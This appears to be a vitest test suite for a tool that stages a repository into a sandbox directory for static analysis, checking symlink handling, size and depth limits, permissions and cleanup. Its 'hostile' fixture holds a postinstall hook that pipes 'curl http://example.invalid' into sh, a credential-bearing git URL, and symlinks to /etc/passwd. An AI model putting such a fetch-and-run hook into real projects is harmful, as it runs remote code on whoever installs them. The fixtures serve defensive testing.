import { execFile } from "node:child_process";
import { existsSync } from "node:fs";
import {
  chmod,
  lstat,
  mkdir,
  mkdtemp,
  readdir,
  readFile,
  readlink,
  rm,
  stat,
  symlink,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, isAbsolute, join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { analyse } from "./analyse.js";
import { ANALYSIS_LIMITS } from "./constants.js";
import { AnalysisError } from "./errors.js";
import { parseRepositoryFacts } from "./facts.js";
import { directorySource } from "./source.js";
import { analyserFiles, STAGED_ENTRY, STAGING_LIMITS, stageAnalysis } from "./stage.js";

const run = promisify(execFile);
const distribution = join(dirname(fileURLToPath(import.meta.url)), "..", "dist");

let base: string;

beforeAll(async () => {
  // The staged tool is the built one, as it is in the sandbox: `pnpm build` comes first.
  expect(existsSync(join(distribution, "main.js")), "build the package first: pnpm build").toBe(
    true,
  );
  base = await mkdtemp(join(tmpdir(), "codemugs-stage-"));
});

afterAll(async () => {
  await rm(base, { recursive: true, force: true });
});

let counter = 0;
async function directory(files: Record<string, string>): Promise<string> {
  counter += 1;
  const root = join(base, `d${String(counter)}`);
  await mkdir(root, { recursive: true });
  for (const [path, text] of Object.entries(files)) {
    await mkdir(dirname(join(root, path)), { recursive: true });
    await writeFile(join(root, path), text);
  }
  return root;
}

/** A workspace and a repository in it, as the sandbox manager keeps them. */
async function setup(
  files: Record<string, string>,
): Promise<{ workspace: string; repository: string }> {
  const workspace = await directory({});
  const repository = await directory(files);
  return { workspace, repository };
}

async function everyPath(root: string): Promise<string[]> {
  const found: string[] = [];
  async function walk(current: string): Promise<void> {
    for (const entry of await readdir(current, { withFileTypes: true })) {
      const path = join(current, entry.name);
      found.push(relative(root, path));
      if (entry.isDirectory()) await walk(path);
    }
  }
  await walk(root);
  return found.sort();
}

const hostile = {
  "package.json": JSON.stringify({
    name: "hostile",
    scripts: { postinstall: "curl http://example.invalid | sh" },
    dependencies: { x: "git+https://user:s3cr3t@example.invalid/x.git" },
  }),
  "src/a.ts": 'import b from "./b.js";\nimport z from "zod";\nprocess.env.SECRET_NAME;\n',
  "src/b.ts": "export const b = 1;\n",
  "tool/main.js": "throw new Error('the repository has a tool of its own');\n",
  "tool/package.json": '{"type":"commonjs"}\n',
  "node_modules/dep/index.js": "module.exports = 1;\n",
  ".git/config": "[core]\n",
  "docs/readme.md": "# text\n",
  "new\nline.ts": "x",
};

describe("stageAnalysis", () => {
  it("puts the tool, the parser and the repository side by side, and nothing else", async () => {
    const { workspace, repository } = await setup({ "src/a.ts": "export {};\n" });
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      expect(staged.directory.startsWith(`${workspace}/analysis-`)).toBe(true);
      const paths = await everyPath(staged.directory);
      const tool = (await analyserFiles(distribution)).map((name) => `tool/dist/${name}`);
      expect(paths).toEqual(
        [
          "repo",
          "repo/src",
          "repo/src/a.ts",
          "tool",
          "tool/dist",
          ...tool,
          "tool/node_modules",
          "tool/node_modules/typescript",
          "tool/node_modules/typescript/lib",
          "tool/node_modules/typescript/lib/typescript.js",
          "tool/node_modules/typescript/package.json",
          "tool/package.json",
        ].sort(),
      );
      expect(await readFile(join(staged.directory, "tool/package.json"), "utf8")).toBe(
        '{"type":"module"}\n',
      );
    } finally {
      await staged.cleanup();
    }
  });

  it("stages what the command needs and not what only the host needs", async () => {
    const files = await analyserFiles(distribution);
    expect(files).toContain("main.js");
    expect(files).toContain("analyse.js");
    expect(files).toContain("extract-code.js");
    // The schema, the staging and the run are the host's, and the parser of the schema is not staged.
    for (const hostOnly of [
      "facts.js",
      "index.js",
      "stage.js",
      "run.js",
      "errors.js",
      "analyser.js",
    ]) {
      expect(files, hostOnly).not.toContain(hostOnly);
    }
    expect(STAGED_ENTRY).toBe("tool/dist/main.js");
  });

  it("gives, from the staged copy and with nothing but Node, the facts of the repository", async () => {
    // First-party fixtures, as in every test of the analyser: a test is not the sandbox, and it says
    // nothing of isolation. What it shows is that the staged tool is complete and the copy is faithful.
    const { workspace, repository } = await setup(hostile);
    await symlink("/etc/passwd", join(repository, "link-to-file"));
    await symlink("/", join(repository, "link-to-directory"));
    await writeFile(join(repository, "big.bin"), Buffer.alloc(ANALYSIS_LIMITS.maxFileBytes + 1000));
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      const { stdout } = await run(process.execPath, [
        join(staged.directory, STAGED_ENTRY),
        join(staged.directory, "repo"),
      ]);
      const fromStaged = parseRepositoryFacts(stdout);
      const direct = await analyse(directorySource(repository));
      expect(fromStaged).toEqual(direct);
      expect(fromStaged.limits.skipped).toMatchObject({
        symlink: 2,
        tooLarge: 1,
        ignoredDirectory: 2,
        badName: 1,
      });
    } finally {
      await staged.cleanup();
    }
  }, 60_000);

  it("keeps a tool of the repository's own under repo/, where it cannot be the tool", async () => {
    const { workspace, repository } = await setup(hostile);
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      expect(await readFile(join(staged.directory, "repo/tool/main.js"), "utf8")).toContain(
        "of its own",
      );
      expect(await readFile(join(staged.directory, "repo/tool/package.json"), "utf8")).toContain(
        "commonjs",
      );
      expect(await readFile(join(staged.directory, "tool/package.json"), "utf8")).toContain(
        "module",
      );
      expect(await readFile(join(staged.directory, "tool/dist/main.js"), "utf8")).not.toContain(
        "of its own",
      );
    } finally {
      await staged.cleanup();
    }
  });

  it("makes a link again that points at nothing, and never reads or shows what it pointed at", async () => {
    const { workspace, repository } = await setup({ "a.ts": "x" });
    const outside = await directory({ "secret.txt": "TOP-SECRET-CONTENT" });
    await symlink(join(outside, "secret.txt"), join(repository, "to-secret"));
    await symlink(outside, join(repository, "to-directory"));
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      for (const name of ["to-secret", "to-directory"]) {
        const path = join(staged.directory, "repo", name);
        expect((await lstat(path)).isSymbolicLink()).toBe(true);
        expect(await readlink(path)).toBe(".");
      }
      const all = await everyPath(staged.directory);
      expect(all.some((path) => path.endsWith("secret.txt"))).toBe(false);
    } finally {
      await staged.cleanup();
    }
  });

  it("makes the directories that the analyser does not read, empty, so that they are still counted", async () => {
    const { workspace, repository } = await setup({
      "node_modules/a/index.js": "x",
      ".git/objects/x": "x",
      "dist/out.js": "x",
      "src/node_modules/b/index.js": "x",
    });
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      const paths = await everyPath(join(staged.directory, "repo"));
      expect(paths).toEqual([".git", "dist", "node_modules", "src", "src/node_modules"]);
    } finally {
      await staged.cleanup();
    }
  });

  it("gives a file that is too large for the analyser its size and no content, and takes no space for it", async () => {
    const { workspace, repository } = await setup({ "a.ts": "x" });
    const size = ANALYSIS_LIMITS.maxFileBytes * 8;
    await writeFile(join(repository, "big.bin"), Buffer.alloc(size, 1));
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      const copy = await stat(join(staged.directory, "repo/big.bin"));
      expect(copy.size).toBe(size);
      expect(copy.blocks * 512).toBeLessThan(size / 2);
      const content = await readFile(join(staged.directory, "repo/big.bin"));
      expect(content.every((byte) => byte === 0)).toBe(true);
    } finally {
      await staged.cleanup();
    }
  });

  it("copies a file that is exactly as large as the analyser reads", async () => {
    const { workspace, repository } = await setup({});
    await writeFile(join(repository, "exact.txt"), Buffer.alloc(ANALYSIS_LIMITS.maxFileBytes, 65));
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      const copy = await readFile(join(staged.directory, "repo/exact.txt"));
      expect(copy.length).toBe(ANALYSIS_LIMITS.maxFileBytes);
      expect(copy[0]).toBe(65);
    } finally {
      await staged.cleanup();
    }
  });

  it("makes every directory and file readable by a user that owns nothing, whatever it was", async () => {
    const { workspace, repository } = await setup({ "private/secret.ts": "x", "open.ts": "y" });
    await chmod(join(repository, "private"), 0o700);
    await chmod(join(repository, "private/secret.ts"), 0o600);
    await chmod(join(repository, "open.ts"), 0o777);
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      for (const path of await everyPath(staged.directory)) {
        const info = await lstat(join(staged.directory, path));
        if (info.isSymbolicLink()) continue;
        expect(info.mode & 0o777, path).toBe(info.isDirectory() ? 0o755 : 0o644);
      }
      expect((await stat(staged.directory)).mode & 0o777).toBe(0o755);
    } finally {
      await staged.cleanup();
    }
  });

  it("makes them readable when the process that stages them has a strict umask", async () => {
    const { workspace, repository } = await setup({ "src/a.ts": "x" });
    // A file that is too large is made another way, and has to be readable as well.
    await writeFile(join(repository, "big.bin"), Buffer.alloc(ANALYSIS_LIMITS.maxFileBytes + 1));
    const before = process.umask(0o077);
    let staged: Awaited<ReturnType<typeof stageAnalysis>>;
    try {
      staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    } finally {
      process.umask(before);
    }
    try {
      for (const path of await everyPath(staged.directory)) {
        const info = await lstat(join(staged.directory, path));
        if (info.isSymbolicLink()) continue;
        expect(info.mode & 0o777, path).toBe(info.isDirectory() ? 0o755 : 0o644);
      }
      expect((await stat(staged.directory)).mode & 0o777).toBe(0o755);
    } finally {
      await staged.cleanup();
    }
  });

  it("gives a directory that is a plain absolute path, from a workspace that was given as a relative one", async () => {
    const { workspace, repository } = await setup({ "a.ts": "x" });
    const staged = await stageAnalysis({
      repository,
      workspaceRoot: relative(process.cwd(), workspace),
    });
    try {
      expect(isAbsolute(staged.directory)).toBe(true);
      expect(existsSync(join(staged.directory, STAGED_ENTRY))).toBe(true);
    } finally {
      await staged.cleanup();
    }
  });

  it("does not copy what is not a file of the repository", async () => {
    const { workspace, repository } = await setup({ "a.ts": "x" });
    await run("mkfifo", [join(repository, "pipe")]);
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      expect(await everyPath(join(staged.directory, "repo"))).toEqual(["a.ts"]);
    } finally {
      await staged.cleanup();
    }
  });

  it("does not change the repository", async () => {
    const { workspace, repository } = await setup(hostile);
    const before = await everyPath(repository);
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    await staged.cleanup();
    expect(await everyPath(repository)).toEqual(before);
  });

  it("removes what it made when asked, and when asked again", async () => {
    const { workspace, repository } = await setup({ "a.ts": "x" });
    const staged = await stageAnalysis({ repository, workspaceRoot: workspace });
    expect(existsSync(staged.directory)).toBe(true);
    await staged.cleanup();
    expect(existsSync(staged.directory)).toBe(false);
    await staged.cleanup();
    expect(await readdir(workspace)).toEqual([]);
  });

  it("gives each analysis a directory of its own", async () => {
    const { workspace, repository } = await setup({ "a.ts": "x" });
    const first = await stageAnalysis({ repository, workspaceRoot: workspace });
    const second = await stageAnalysis({ repository, workspaceRoot: workspace });
    try {
      expect(first.directory).not.toBe(second.directory);
    } finally {
      await first.cleanup();
      await second.cleanup();
    }
  });
});

describe("stageAnalysis, when it cannot", () => {
  async function refused(
    files: Record<string, string>,
    limits: Parameters<typeof stageAnalysis>[0]["limits"],
  ): Promise<{ error: unknown; workspace: string }> {
    const { workspace, repository } = await setup(files);
    try {
      await stageAnalysis({ repository, workspaceRoot: workspace, limits });
    } catch (error) {
      return { error, workspace };
    }
    throw new Error("it staged the repository");
  }

  it("says that a repository that cannot be read cannot, and leaves nothing behind", async () => {
    const workspace = await directory({});
    for (const repository of [join(base, "does-not-exist"), join(workspace, "..", "d1", "x")]) {
      await expect(stageAnalysis({ repository, workspaceRoot: workspace })).rejects.toMatchObject({
        code: "repository_unreadable",
      });
    }
    const file = join(workspace, "a-file");
    await writeFile(file, "x");
    await expect(
      stageAnalysis({ repository: file, workspaceRoot: workspace }),
    ).rejects.toMatchObject({
      code: "repository_unreadable",
    });
    expect((await readdir(workspace)).filter((name) => name.startsWith("analysis-"))).toEqual([]);
  });

  it("refuses a repository with more entries than the limit, and leaves nothing behind", async () => {
    const { error, workspace } = await refused(
      { "a.ts": "x", "b.ts": "x", "c.ts": "x" },
      { maxEntries: 2 },
    );
    expect(error).toBeInstanceOf(AnalysisError);
    expect((error as AnalysisError).code).toBe("repository_too_large");
    expect((await readdir(workspace)).filter((name) => name.startsWith("analysis-"))).toEqual([]);
  });

  it("counts directories and links as entries, and accepts exactly the limit", async () => {
    const { workspace, repository } = await setup({ "d/a.ts": "x" });
    await symlink("a.ts", join(repository, "link"));
    // d, d/a.ts, link
    const staged = await stageAnalysis({
      repository,
      workspaceRoot: workspace,
      limits: { maxEntries: 3 },
    });
    await staged.cleanup();
    await expect(
      stageAnalysis({ repository, workspaceRoot: workspace, limits: { maxEntries: 2 } }),
    ).rejects.toMatchObject({ code: "repository_too_large" });
  });

  it("refuses a repository with more content than the limit", async () => {
    const { error } = await refused(
      { "a.ts": "x".repeat(60), "b.ts": "x".repeat(60) },
      { maxContentBytes: 100 },
    );
    expect((error as AnalysisError).code).toBe("repository_too_large");
  });

  it("accepts exactly as much content as the limit", async () => {
    const { workspace, repository } = await setup({
      "a.ts": "x".repeat(50),
      "b.ts": "x".repeat(50),
    });
    const staged = await stageAnalysis({
      repository,
      workspaceRoot: workspace,
      limits: { maxContentBytes: 100 },
    });
    await staged.cleanup();
  });

  it("does not count a file that is not copied as content", async () => {
    const { workspace, repository } = await setup({ "a.ts": "x" });
    await writeFile(join(repository, "big.bin"), Buffer.alloc(ANALYSIS_LIMITS.maxFileBytes * 3));
    const staged = await stageAnalysis({
      repository,
      workspaceRoot: workspace,
      limits: { maxContentBytes: 10 },
    });
    await staged.cleanup();
  });

  it("refuses a repository that is nested deeper than the limit", async () => {
    const { error } = await refused({ "a/b/c/d/e.ts": "x" }, { maxDepth: 3 });
    expect((error as AnalysisError).code).toBe("repository_too_large");
  });

  it("accepts a repository that is nested exactly as deep as the limit", async () => {
    const { workspace, repository } = await setup({ "a/b/c/e.ts": "x" });
    const staged = await stageAnalysis({
      repository,
      workspaceRoot: workspace,
      limits: { maxDepth: 3 },
    });
    await staged.cleanup();
  });

  it("does not take a limit that is higher than its own, or one that it does not know", async () => {
    const { workspace, repository } = await setup({ "a.ts": "x" });
    await expect(
      stageAnalysis({ repository, workspaceRoot: workspace, limits: { nothing: 1 } as never }),
    ).rejects.toThrow("unknown limit");
    await expect(
      stageAnalysis({ repository, workspaceRoot: workspace, limits: { maxEntries: -1 } }),
    ).rejects.toThrow("not negative");
    expect(Object.isFrozen(STAGING_LIMITS)).toBe(true);
    // A limit that is asked to be higher is the host's own: this repository has fewer than that.
    const staged = await stageAnalysis({
      repository,
      workspaceRoot: workspace,
      limits: { maxEntries: STAGING_LIMITS.maxEntries * 10 },
    });
    await staged.cleanup();
  });

  it("takes no limit that is higher than its own: a limit that is asked to be higher is its own", async () => {
    // A repository that is nested one directory deeper than the host's limit, with a request for a
    // limit that would accept it.
    const { error } = await refused(
      { [`${"d/".repeat(STAGING_LIMITS.maxDepth + 1)}e.ts`]: "x" },
      { maxDepth: STAGING_LIMITS.maxDepth * 10 },
    );
    expect((error as AnalysisError).code).toBe("repository_too_large");
  });

  it("takes a limit that is a whole number and not a fraction", async () => {
    const { workspace, repository } = await setup({ "a.ts": "x" });
    await expect(
      stageAnalysis({ repository, workspaceRoot: workspace, limits: { maxEntries: 1.5 } }),
    ).rejects.toThrow("whole number");
  });

  it("says nothing of the repository's names in what it throws", async () => {
    const { error } = await refused(
      { "SECRET-NAME.ts": "x", "SECRET-OTHER.ts": "x" },
      { maxEntries: 1 },
    );
    expect(String((error as Error).message)).not.toContain("SECRET");
  });
});

describe("analyserFiles", () => {
  async function build(files: Record<string, string>): Promise<string> {
    return directory(files);
  }

  it("follows what the entry imports, and what those import, and nothing else", async () => {
    const dist = await build({
      "main.js":
        'import { a } from "./a.js";\nimport ts from "typescript";\nimport { x } from "node:path";\n',
      "a.js": 'import {\n  b,\n  c,\n} from "./b.js";\nexport { d } from "./d.js";\n',
      "b.js": 'import "./side.js";\nexport const B = "from \\"nothing\\"";\n',
      "d.js": "export const d = 1;\n",
      "side.js": "export {};\n",
      "facts.js": 'import { z } from "zod";\n',
    });
    expect(await analyserFiles(dist)).toEqual(["a.js", "b.js", "d.js", "main.js", "side.js"]);
  });

  it("stops at an import that it does not know how to stage", async () => {
    for (const statement of [
      'import z from "zod";',
      'export { z } from "zod";',
      'import "left-pad";',
      'import x from "../up.js";',
      'import x from "./a/b.js";',
    ]) {
      const dist = await build({ "main.js": `${statement}\n` });
      await expect(analyserFiles(dist), statement).rejects.toThrow("not staged");
    }
  });

  it("is not fooled by a string that holds an import", async () => {
    const dist = await build({
      "main.js":
        'export const text = "import x from \\"zod\\"";\nexport const other = "from \\"y\\"";\n',
    });
    expect(await analyserFiles(dist)).toEqual(["main.js"]);
  });

  it("fails when a file that is imported is not there", async () => {
    const dist = await build({ "main.js": 'import "./missing.js";\n' });
    await expect(analyserFiles(dist)).rejects.toThrow();
  });
});
